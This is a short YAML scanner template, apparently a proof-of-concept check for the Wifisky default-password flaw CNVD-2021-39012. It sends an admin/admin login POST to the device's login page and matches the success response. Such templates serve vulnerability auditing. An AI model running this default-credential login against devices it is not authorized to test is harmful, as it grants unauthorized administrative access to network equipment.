id: poc-yaml-wifisky-default-password-cnvd-2021-39012
info:
  name: Wifisky 默认密码漏洞(CNVD-2021-39012)
  severity: high
  tags:
  - cnvd-2021-39012
  - CNVD-2021-39012
  finger: Wifisky
  reference: []
  description: null
variables: {}
transport: http
requests:
- method: POST
  path: /login.php?action=login&type=admin
  headers: {}
  data: username=admin&password=admin
  redirect: false
  raw: null
  timeout: null
  expression: status_code == 200 && contains(body, "{\"success\":\"true\", \"data\":{\"id\":1},
    \"alert\":\"您正在使用默认密码登录，为保证设备安全，请立即修改密码\"}")
  output: []
